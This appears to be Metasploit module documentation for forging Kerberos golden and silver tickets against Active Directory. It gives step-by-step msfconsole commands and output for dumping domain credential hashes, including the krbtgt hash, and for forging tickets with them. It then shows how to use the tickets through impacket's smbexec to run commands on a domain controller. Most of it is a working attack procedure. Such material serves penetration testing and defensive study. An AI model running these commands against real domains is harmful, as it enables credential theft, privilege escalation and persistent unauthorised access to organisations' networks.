# Kerberos Ticket Forging (Golden/Silver tickets)

The `forge_ticket` module allows the forging of a golden or silver ticket.

## Vulnerable Application

Any system leveraging kerberos as a means of authentication e.g. Active Directory, MSSQL

## Pre-Verification steps

1. Obtain your targets DOMAIN via your favorite method: e.g.
    `nmap <TARGET_IP>`
2. Next retrieve the DOMAIN_SID: e.g.
    `mimikatz # sekurlsa::logonpasswords`
    or
    `use auxiliary/gather/windows_secrets_dump`
3. Finally get the NTHASH or AES key (prefer AES key if available) of the service account you wish to target: e.g.
    `mimikatz # sekurlsa::logonpasswords` - same command as before, shows you both values

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/admin/kerberos/forge_ticket`
3. Do: `set DOMAIN DW.LOCAL`
4. Do: `set DOMAIN_SID S-1-5-21-1755879683-3641577184-3486455962`
5. Do: `set NTHASH 88E4D9FABAECF3DEC18DD80905521B29`
6. Do: `set USER fake_user`
7. Do: `set USER_RID 500`
8. Do: `set SPN MSSqlSvc/dc1.dw.local:1433` (Option only used for silver tickets)
9. Do: `forge_silver` to generate a silver ticket or `forge_golden` for a golden ticket
10. Use your ticket which will have been stored as loot with your chosen target
11. Example usage in impacket:
    ```
    export KRB5CCNAME=/path/to/ticket
    python3 mssqlclient.py DW.LOCAL/fake_mysql@dc1.dw.local -k -no-pass
    ```

## Actions

There are two kind of actions the module can run:

1. **FORGE_SILVER** - Forge a Silver ticket. [Default]
2. **FORGE_GOLDEN** - Forge a Golden ticket.
3. **DEBUG_TICKET** - Print the contents of a ccache or kirbi file.

## Scenarios

### Forge Golden ticket

Golden tickets can be used for persistence in an Active Directory environment. The forged golden ticket is actually a Ticket Granting Ticket (TGT) - which can be used to request arbitrary Service tickets. This module does not connect directly to a Key Distribution Center (KDC), it instead forges its own ticket.

Golden tickets can be forged using a stolen Kerberos `krbtgt` account, using a password hash in NTHASH format.

For golden ticket attacks, the following information is required:

1. `DOMAIN` - The domain, i.e.`adf3.local`
2. `DOMAIN_SID` - This is the Security Identifier for the system, i.e. `S-1-5-21-1266190811-2419310613-1856291569`
3. `NTHASH` - The NTHASH for the krbtgt account, i.e. `767400b2c71afa35a5dca216f2389cd9`
4. `USER` - This username will be stored within the forged ticket, this must be a user that exists in Active Directory
5. `USER_RID` - The relative identifier(RID) for users will be stored within the forged ticket, i.e. Administrator accounts have a RID of `500`

One way of extracting the krbtgt account NTHASH is to run the `auxiliary/gather/windows_secrets_dump` module:

```
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(gather/windows_secrets_dump) > run smb://adf3.local;Administrator:p4$$w0rd@dc3.adf3.local
[*] Running module against 192.168.123.13

[*] 192.168.123.13:445 - Service RemoteRegistry is already running
[*] 192.168.123.13:445 - Retrieving target system bootKey
[+] 192.168.123.13:445 - bootKey: 0xa03745c7a9597f105a4df1e84a5aef04

... omitted for brevity ...

[*] 192.168.123.13:445 - Decrypting NL$KM
[*] 192.168.123.13:445 - Dumping cached hashes
No cached hashes on this system
[*] 192.168.123.13:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 192.168.123.13:445 - Using the DRSUAPI method to get NTDS.DIT secrets
[*] 192.168.123.13:445 - SID enumeration progress -  0 / 24 ( 0.00%)
[*] 192.168.123.13:445 - SID enumeration progress - 24 / 24 (  100%)
# SID's:
ADF3\Administrator: S-1-5-21-1266190811-2419310613-1856291569-500
ADF3\Guest: S-1-5-21-1266190811-2419310613-1856291569-501
ADF3\krbtgt: S-1-5-21-1266190811-2419310613-1856291569-502 <------------- Use the SID from here, the part before RID 502
ADF3\DefaultAccount: S-1-5-21-1266190811-2419310613-1856291569-503
ADF3\j.blogs: S-1-5-21-1266190811-2419310613-1856291569-1104
ADF3\admin: S-1-5-21-1266190811-2419310613-1856291569-1112
ADF3\DC3$: S-1-5-21-1266190811-2419310613-1856291569-1001
ADF3\WIN10-DC3$: S-1-5-21-1266190811-2419310613-1856291569-1608
ADF3\WIN11-DC3$: S-1-5-21-1266190811-2419310613-1856291569-1609

... omitted for brevity ...

# NTLM hashes:
ADF3\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ede47af254546a82b1743953cc4950:::
ADF3\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ADF3\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:767400b2c71afa35a5dca216f2389cd9::: <-- The krbtgt NTHASH
```

With the above information a golden ticket can be forged:

```
msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN domain=adf3.local domain_sid=S-1-5-21-1266190811-2419310613-1856291569 nthash=767400b2c71afa35a5dca216f2389cd9 user=Administrator

[+] MIT Credential Cache ticket saved on /Users/user/.msf4/loot/20220831223726_default_192.168.123.13_kerberos_ticket._550522.bin
[*] Auxiliary module execution completed
```

This newly created golden ticket is a ticket granting ticket which can be used to generate service tickets without a username or password. Common services include WinRM, SMB, etc.

Example using a golden ticket with Metasploit:

Not currently currently supported.

Example using a golden ticket with impacket:

```
export KRB5CCNAME=/Users/user/.msf4/loot/20220831223726_default_192.168.123.13_kerberos_ticket._550522.bin
python3 ~/impacket/examples/smbexec.py 'adf3.local/Administrator@dc3.adf3.local' -dc-ip 192.168.123.13 -k -no-pass
```

If this is not working for you, there is a section dedicated to common errors below.

### Forging Silver ticket

A silver ticket is similar to a golden ticket. The user will compromise the password hash for a service or computer account to forge tickets which grant persistent access to services such as SMB/LDAP/MSSQL/etc.

For silver ticket attacks the following information is required:

1. `DOMAIN` - The domain, i.e.`adf3.local`
2. `DOMAIN_SID` This is the Security Identifier for the system, i.e. `S-1-5-21-1266190811-2419310613-1856291569`
3. `NTHASH` - The NTHASH for the service or computer account, i.e. `767400b2c71afa35a5dca216f2389cd9`
4. `USER` - This username will be stored within the forged ticket, unlike with Golden tickets - this can be a non-existent user
5. `USER_RID` - The relative identifier(RID) for users will be stored within the forged ticket, i.e. Administrator accounts have a RID of `500`
6. `SPN` - The Service Principal name, i.e. `CIFS` for SMB access, or `MSSqlSvc/dc1.dw.local:1433`. Other examples can be seen by running `setspn -q */*` on the target

Example Service Principal Names:

| Service Type | Server Principal Name |
|--------------|-----------------------|
| WMI          | HOST or RPCSS         |
| WinRM        | HOST or HTTP          |
| SMB          | CIFS                  |
| LDAP         | LDAP                  |
| MSSQL        | MSSqlSvc              |

One way of extracting the computer account NTHASH is to run the `auxiliary/gather/windows_secrets_dump` module:

```
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(gather/windows_secrets_dump) > run smb://adf3.local;Administrator:p4$$w0rd@dc3.adf3.local
[*] Running module against 192.168.123.13

[*] 192.168.123.13:445 - Service RemoteRegistry is already running
[*] 192.168.123.13:445 - Retrieving target system bootKey
[+] 192.168.123.13:445 - bootKey: 0xa03745c7a9597f105a4df1e84a5aef04

... omitted for brevity ...

[*] 192.168.123.13:445 - Decrypting NL$KM
[*] 192.168.123.13:445 - Dumping cached hashes
No cached hashes on this system
[*] 192.168.123.13:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 192.168.123.13:445 - Using the DRSUAPI method to get NTDS.DIT secrets
[*] 192.168.123.13:445 - SID enumeration progress -  0 / 24 ( 0.00%)
[*] 192.168.123.13:445 - SID enumeration progress - 24 / 24 (  100%)
# SID's:
ADF3\Administrator: S-1-5-21-1266190811-2419310613-1856291569-500
ADF3\Guest: S-1-5-21-1266190811-2419310613-1856291569-501
ADF3\krbtgt: S-1-5-21-1266190811-2419310613-1856291569-502
ADF3\DefaultAccount: S-1-5-21-1266190811-2419310613-1856291569-503
ADF3\j.blogs: S-1-5-21-1266190811-2419310613-1856291569-1104
ADF3\admin: S-1-5-21-1266190811-2419310613-1856291569-1112
ADF3\DC3$: S-1-5-21-1266190811-2419310613-1856291569-1001 <------------- Use the SID from the targeted computer account, the part before RID 1001

... omitted for brevity ...

# NTLM hashes:
ADF3\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ede47af254546a82b1743953cc4950:::
ADF3\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ADF3\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:767400b2c71afa35a5dca216f2389cd9:::
... omitted for brevity ...
ADF3\DC3$:1001:aad3b435b51404eeaad3b435b51404ee:fbd103200439e14d4c8adad675d5f244::: <-- The NTHASH for the targeted computer account
```

With the above information a silver ticket for SMB can be forged for the target host:

```
msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_SILVER domain=adf3.local domain_sid=S-1-5-21-1266190811-2419310613-1856291569 nthash=fbd103200439e14d4c8adad675d5f244 user=Administrator spn=cifs/dc3.adf3.local

[+] MIT Credential Cache ticket saved on /Users/user/.msf4/loot/20220831223726_default_192.168.123.13_kerberos_ticket._550522.bin
[*] Auxiliary module execution completed
```

Example using a silver ticket with impacket:

```
export KRB5CCNAME=/Users/user/.msf4/loot/20220901132003_default_192.168.123.13_kerberos_ticket._554255.bin
python3 $code/impacket/examples/smbexec.py 'adf3.local/Administrator@dc3.adf3.local' -dc-ip 192.168.123.13 -k -no-pass
```

### Debugging Ticket contents

This action allows you to see the contents of any ccache or kirbi file,
If you are able to provide the decryption key we can also show the encrypted parts of the tickets.

1. `TICKET_PATH` - The path to the ccache or kirbi file.
2. `AES_KEY` - (Optional) Only set this if you have the decryption key and it is an AES128 or AES256 key.
3. `NTHASH` - (Optional) Only set this if you have the decryption key and it is an NTHASH.
No other options are used in this action.

**With Key**
```
msf6 auxiliary(admin/kerberos/forge_ticket) > run action=DEBUG_TICKET AES_KEY=4b912be0366a6f37f4a7d571bee18b1173d93195ef76f8d1e3e81ef6172ab326 TICKET_PATH=/path/to/ticket
```

Example output:
```
Primary Principal: Administrator@WINDOMAIN.LOCAL
Ccache version: 4

Creds: 1
  Credential[0]:
    Server: cifs/dc.windomain.local@WINDOMAIN.LOCAL
    Client: Administrator@WINDOMAIN.LOCAL
    Ticket etype: 18 (AES256)
    Key: 3436643936633032656264663030393931323461366635653364393932613763
    Ticket Length: 978
    Subkey: false
    Addresses: 0
    Authdatas: 0
    Times:
      Auth time: 2022-11-21 13:52:00 +0000
      Start time: 2022-11-21 13:52:00 +0000
      End time: 2032-11-18 13:52:00 +0000
      Renew Till: 2032-11-18 13:52:00 +0000
    Ticket:
      Ticket Version Number: 5
      Realm: WINDOMAIN.LOCAL
      Server Name: cifs/dc.windomain.local
      Encrypted Ticket Part:
        Ticket etype: 18 (AES256)
        Key Version Number: 2
        Decrypted (with key: \x4b\x91\x2b\xe0\x36\x6a\x6f\x37\xf4\xa7\xd5\x71\xbe\xe1\x8b\x11\x73\xd9\x31\x95\xef\x76\xf8\xd1\xe3\xe8\x1e\xf6\x17\x2a\xb3\x26):
          Times:
            Auth time: 2022-11-21 13:52:00 UTC
            Start time: 2022-11-21 13:52:00 UTC
            End time: 2032-11-18 13:52:00 UTC
            Renew Till: 2032-11-18 13:52:00 UTC
          Client Addresses: 0
          Transited: tr_type: 0, Contents: ""
          Client Name: 'Administrator'
          Client Realm: 'WINDOMAIN.LOCAL'
          Ticket etype: 18 (AES256)
          Encryption Key: 3436643936633032656264663030393931323461366635653364393932613763
          Flags: 0x50a00000 (FORWARDABLE, PROXIABLE, RENEWABLE, PRE_AUTHENT)
          PAC:
            Validation Info:
              Logon Time: 2022-11-21 13:52:00 +0000
              Logoff Time: Never Expires (inf)
              Kick Off Time: Never Expires (inf)
              Password Last Set: No Time Set (0)
              Password Can Change: No Time Set (0)
              Password Must Change: Never Expires (inf)
              Logon Count: 0
              Bad Password Count: 0
              User ID: 500
              Primary Group ID: 513
              User Flags: 0
              User Session Key: \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
              User Account Control: 528
              Sub Auth Status: 0
              Last Successful Interactive Logon: No Time Set (0)
              Last Failed Interactive Logon: No Time Set (0)
              Failed Interactive Logon Count: 0
              SID Count: 0
              Resource Group Count: 0
              Group Count: 5
              Group IDs:
                Relative ID: 513, Attributes: 7
                Relative ID: 512, Attributes: 7
                Relative ID: 520, Attributes: 7
                Relative ID: 518, Attributes: 7
                Relative ID: 519, Attributes: 7
              Logon Domain ID: S-1-5-21-3541430928-2051711210-1391384369
              Effective Name: 'Administrator'
              Full Name: ''
              Logon Script: ''
              Profile Path: ''
              Home Directory: ''
              Home Directory Drive: ''
              Logon Server: ''
              Logon Domain Name: 'WINDOMAIN.LOCAL'
            Client Info:
              Name: 'Administrator'
              Client ID: 2022-11-21 13:52:00 +0000
            Pac Server Checksum:
              Signature: \x04\xe5\xab\x06\x1c\x7a\x90\x9a\x26\xb1\x22\xc2
            Pac Privilege Server Checksum:
              Signature: \x71\x0b\xb1\x83\x85\x82\x57\xf4\x10\x21\xbd\x7e
```
**Without Key**

```
msf6 auxiliary(admin/kerberos/forge_ticket) > run action=DEBUG_TICKET TICKET_PATH=/path/to/ticket
```

Example Output:
```
Primary Principal: Administrator@WINDOMAIN.LOCAL
Ccache version: 4

Creds: 1
  Credential[0]:
    Server: cifs/dc.windomain.local@WINDOMAIN.LOCAL
    Client: Administrator@WINDOMAIN.LOCAL
    Ticket etype: 18 (AES256)
    Key: 3436643936633032656264663030393931323461366635653364393932613763
    Ticket Length: 978
    Subkey: false
    Addresses: 0
    Authdatas: 0
    Times:
      Auth time: 2022-11-21 13:52:00 +0000
      Start time: 2022-11-21 13:52:00 +0000
      End time: 2032-11-18 13:52:00 +0000
      Renew Till: 2032-11-18 13:52:00 +0000
    Ticket:
      Ticket Version Number: 5
      Realm: WINDOMAIN.LOCAL
      Server Name: cifs/dc.windomain.local
      Encrypted Ticket Part:
        Ticket etype: 18 (AES256)
        Key Version Number: 2
        Cipher:
          1YrnB+fhzeLEq+4NUcXvoEsSI29+gwCDg3qjYdb0YHhqx23BhZGOK9rIQ99uXeuLHSapJAanCE9g/PyyKDE1kggrEHfy6cxwsP25exmN2w3NXVm7P0PqMVON2RBp2S11eIdF/Zibhrs7JbaaVw0Hv8GpbpHdFI0l6Xx3Jz+y0bqFsFNEsU8nEW35Z3Oo2xpI/xTwNTyG1Bmg+bktSLyI6nEPtJXQKcoJTrNhSBNsZ18HZiUPim9EqSCHUh0VbDeLntryh+lt0TIgwhwipHPWnro+Y81dvX5j8ZeBdgKgnoX3jciU629u/RveQJgyw/vLk1KT0RzTbHSwdRk/xi6ghccvew33TKJ8q3nP/JuSWDzaDE6I6v3KgInSZP+XkCAV5VT//U49MtIVIKARcmtXQwVxztMXKlWjIaxQwl9BN6CuyWZjDcafAssjPWgWIAsesmEWHn3btv1BP0a4gvn5f1b7Fu4Gh6w0ARCryxZkSl+6UhJbcdaRT23WhqN24ECGEl0VIX4fuLs6x0gVtAQ2YsI+HkoQYuI+C28gXzJUCac6rJyFQSTsciwj/jVf18ttw1vfGGKa/BVcqscGZoJPpBiuGPBkIbeAOery0Sjn+0tP0tsPYw1OkpzZ7n/j/YdmTX6UAFZjCLbgvF8hoPyider1gntOiSjlLlEUITLTfe5zqWi4gs47Ly6lvggBWW9Yg0fIaPOHYMvsszMLcJz0+dFXtDVI452LIEatLDvp1aKkwGANWYyRgOMlHR3fD030SOTNEb5oa6WigWZQLlhuDbgrfFaWWAMp7opcNbNKy7Iv17EscL7pW2Ygc38VbmbFtdIfvpQ9niwLr2msjzhB7RPihZXcUAlVygLwykq0JDG4fRmoNXzNydbnYlX9E+KW0fHFjoBitAx1xrp9p5Ajwoyy+wIk0mt/aC4pbfcoRjt4GUF/9DhZnH3HiPn4lM9TLMzpiediEtDZtKgGvAAP2cJZn2gsLRlKAtBZvl+ibe1uDzC9g6rnObAx3c+OSG9rmHzBBCq6D8wW6ZjrQy8njNuriC5rnQxUpVhgGvTOkeTphSIHX+D4SuMd+XZ4zqa3DsrHzIeVWAvrTHCDBzy+DKt2RoQTwYmGT+a0YB0btQtgIfRj2OwDtlP65JUxC+/ANelHg73d0REoYistB5ZMmvk=
```

Both these examples Are printing the contents of the same ccache file and showing the difference in output if you have the decryption key available.

### Common Mistakes

**Invalid hostname**

Use the full hostname of the machine you are targeting, not just the domain:

```diff
- python3 ~/impacket/examples/smbexec.py 'adf3.local/Administrator@adf3.local' -dc-ip 192.168.123.13 -k -no-pass
+ python3 ~/impacket/examples/smbexec.py 'adf3.local/Administrator@dc3.adf3.local' -dc-ip 192.168.123.13 -k -no-pass
```

**Invalid SPN**

SPNs must be in the format `*/*`. If this is not identical to what Active Directory is configured with, it will not work.

**Verbose Mode**

If you `set Verbose true` you will set the module to run in a more verbose mode.
This would be useful in cases where the ticket you are forging does not work as expected and in this case
we print out the contents of the ticket after it's been forged similar to the `DEBUG_TICKET` action with the key supplied.
